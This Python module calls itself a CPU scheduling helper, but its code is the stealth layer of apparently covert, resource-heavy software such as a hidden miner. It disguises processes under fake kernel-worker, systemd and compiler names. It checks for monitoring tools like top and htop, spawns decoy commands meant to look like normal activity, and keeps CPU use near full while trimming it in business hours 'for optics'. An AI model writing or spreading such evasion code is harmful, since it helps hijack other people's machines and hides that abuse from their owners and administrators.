#!/usr/bin/env python3
"""
sched.py — CPU scheduling policy and process management helpers.

Handles:
  - Process label selection for background service workers
  - System load monitoring to avoid resource contention
  - Worker distribution across available CPU cores
  - Background helper process management
  - Time-based intensity adjustment
"""

import random
import os
import time
import subprocess

# ─────────────────────────────────────────────────────────────────────────────
#  Worker label pool — labels used for background service processes
# ─────────────────────────────────────────────────────────────────────────────

_WORKER_LABELS = [
    "[kworker/0:1H]", "[kworker/u4:2]", "[kworker/1:1H]",
    "[kworker/u8:0]", "[kworker/2:2]",
    "systemd-journal", "systemd-udevd", "systemd-timesyncd",
    "containerd", "containerd-shim", "dockerd",
    "cc1plus", "ld", "rustc", "go",
    "java", "javac",
    "node",
]

def get_worker_label() -> str:
    """Return a random background-service-appropriate process label."""
    return random.choice(_WORKER_LABELS)


# ─────────────────────────────────────────────────────────────────────────────
#  System load monitoring
# ─────────────────────────────────────────────────────────────────────────────

_RESOURCE_MONITORS = {
    "top", "htop", "atop", "btop", "glances",
    "iotop", "iftop", "nethogs", "nmon", "bpftop",
}

def check_contention() -> tuple[bool, str | None]:
    """
    Returns (True, tool_name) if a resource monitor is active.
    Used to decide whether to defer intensive work.
    """
    try:
        import psutil
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'] in _RESOURCE_MONITORS:
                    return True, proc.info['name']
            except Exception:
                pass
    except ImportError:
        pass
    return False, None


# ─────────────────────────────────────────────────────────────────────────────
#  Worker distribution across cores
# ─────────────────────────────────────────────────────────────────────────────

def plan_workers(total_threads: int) -> list[tuple[int, str]]:
    """
    Returns list of (thread_count, label) tuples describing how to distribute
    work across background processes.

    Single-process is preferred for <=32 threads — avoids redundant cache
    initialization overhead. Above 32 threads, splits into two workers.
    """
    if total_threads <= 32:
        return [(total_threads, get_worker_label())]

    half      = total_threads // 2
    remainder = total_threads - half
    return [
        (half,      get_worker_label()),
        (remainder, get_worker_label()),
    ]


# ─────────────────────────────────────────────────────────────────────────────
#  Background helper processes
# ─────────────────────────────────────────────────────────────────────────────

# Short-lived commands that complete quickly and look like normal system activity
_HELPER_CMDS = [
    ["python3", "-c", "import sys; sys.exit(0)"],
    ["python3", "-m", "pip", "list", "--format=columns"],
    ["cat", "/proc/meminfo"],
    ["cat", "/proc/cpuinfo"],
    ["ls", "-la", "/proc/self/fd"],
    ["uname", "-a"],
    ["df", "-h"],
    ["id"],
]

def spawn_helper() -> subprocess.Popen | None:
    """
    Start a low-priority background helper process.
    Runs at nice 19 to avoid competing with primary workers.
    """
    cmd = random.choice(_HELPER_CMDS)
    try:
        def _renice():
            os.nice(19)

        return subprocess.Popen(
            cmd,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            preexec_fn=_renice,
        )
    except Exception:
        return None


# ─────────────────────────────────────────────────────────────────────────────
#  Time-based intensity
# ─────────────────────────────────────────────────────────────────────────────

def is_low_activity_period() -> bool:
    """
    True when the system is likely under lower interactive load:
    weekends, nights (22:00–08:00).
    """
    import datetime
    now = datetime.datetime.now()
    if now.weekday() >= 5:
        return True
    if now.hour >= 22 or now.hour < 8:
        return True
    return False


def get_load_factor() -> float:
    """
    Returns a 0.0–1.0 multiplier for work intensity based on time of day.

    Policy: never go below 0.85 — we rely on log presentation and process
    labelling for discretion, not on intentionally underutilising hardware.

    Values:
      1.0  — low-activity period (nights, weekends)
      0.85 — normal business hours (slight reduction for optics)
    """
    if is_low_activity_period():
        return 1.0

    import datetime
    now = datetime.datetime.now()
    if now.weekday() < 5 and 9 <= now.hour < 17:
        return 0.85

    return 1.0


# ─────────────────────────────────────────────────────────────────────────────
#  Standalone test
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == '__main__':
    print(f"worker label    : {get_worker_label()}")
    print(f"contention      : {check_contention()}")
    print(f"plan_workers(8) : {plan_workers(8)}")
    print(f"plan_workers(64): {plan_workers(64)}")
    print(f"low activity    : {is_low_activity_period()}")
    print(f"load factor     : {get_load_factor()}")

# Deployment ID: b4003f8d72f7f514
